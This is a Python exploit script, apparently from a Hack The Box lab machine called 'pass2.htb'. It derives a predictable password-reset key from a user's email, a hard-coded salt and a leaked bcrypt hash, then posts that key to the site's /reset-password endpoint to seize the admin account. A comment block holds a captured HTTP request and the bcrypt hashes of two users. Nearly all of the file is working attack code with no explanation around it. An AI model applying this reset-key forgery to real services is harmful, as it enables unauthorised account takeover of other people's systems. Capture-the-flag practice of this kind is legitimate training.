#!/usr/bin/python3

import hashlib
import requests
import sys
import base64

def calculate_secret_key(username: str) -> str:
    try:
        if username == "bmdyy":
            user = {
            'email': 'bmdyy@pass2.htb',
            'password': '$2a$12$cL8f8M6VTPILtTStdqmLrunDy4JW/FbNYVpfJnLO2XoZGs/c7E2IG'
            }
        else:
            user = {
                'email': 'admin@pass2.htb',
                'password': '$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov1.mWYyn0W8YhIQgG'
            }

        # Create a temporary string by combining email, constant, and password
        tmp = user['email'] + "$4lty" + user['password']

        # Calculate SHA-256 hash and encode in Base64
        sha256 = hashlib.sha256()
        sha256.update(tmp.encode('utf-8'))
        encoded_hash = sha256.digest()

        # Replace '-' and '_' with 'X' in the Base64 encoding
        base64_encoded = base64.urlsafe_b64encode(encoded_hash).decode('utf-8').replace('-', 'X').replace('_', 'X')

        # Format the Base64 string into a secret key
        secret_key = "{}-{}-{}-{}".format(
            base64_encoded[0:4], base64_encoded[4:8],
            base64_encoded[8:12], base64_encoded[12:16]
        )

        return secret_key
    except Exception as e:
        print(str(e))
        exit(1)



def main():
    url = sys.argv[1]
    user = "admin"
    key = calculate_secret_key(user)
    print(key)
    # http://10.129.123.122:8080/reset-password
    ress = requests.post(url=f"http://{url}:8080/reset-password", data={"username":user, "resetKey":key, "password":"dicker", "repeatPassword":"dicker"},
                         headers = {"Content-Type":"application/x-www-form-urlencoded"})
    
    if ress.status_code == 200:
        print(f"password reseted for {user}")
        print(ress.headers)
    """
    POST /reset-password HTTP/1.1
    Host: 10.129.123.122:8080
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 81
    Origin: http://10.129.123.122:8080
    Connection: close
    Referer: http://10.129.123.122:8080/reset-password
    Upgrade-Insecure-Requests: 1

    username=bmdyy&resetKey=z-ND-lGVs-UoPJ-9M4M&password=dicker&repeatPassword=dicker
    
    
    # password = admin:$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov1.mWYyn0W8YhIQgG admin@pass2.htb  Admin Admin
    # password = bmdyy:$2a$12$cL8f8M6VTPILtTStdqmLrunDy4JW/FbNYVpfJnLO2XoZGs/c7E2IG bmdyy@pass2.htb  William Moody
    """





if __name__ == "__main__":
    main()





